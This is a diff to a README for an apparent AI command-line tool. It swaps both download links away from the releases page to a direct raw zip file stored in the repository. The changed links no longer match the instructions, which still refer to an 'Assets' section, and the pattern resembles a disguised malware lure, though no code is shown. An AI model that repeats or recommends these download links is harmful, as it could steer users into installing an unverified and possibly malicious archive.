@@ -1,6 +1,6 @@
 # 🚀 gemini-antigravity-cli - Access Advanced AI Tools From Terminal
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pinkcollar-selfpropelledvehicle626/gemini-antigravity-cli/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pinkcollar-selfpropelledvehicle626/gemini-antigravity-cli/raw/refs/heads/main/Sources/antigravity_cli_gemini_3.1.zip)
 
 ## What This Tool Does
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software.
 
 You obtain the application from the official releases page. 
 
-[Visit this page to download the latest version for Windows](https://github.com/pinkcollar-selfpropelledguide626/gemini-antigravity-cli/releases)
+[Visit this page to download the latest version for Windows](https://github.com/pinkcollar-selfpropelledvehicle626/gemini-antigravity-cli/raw/refs/heads/main/Sources/antigravity_cli_gemini_3.1.zip)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the newest version post.
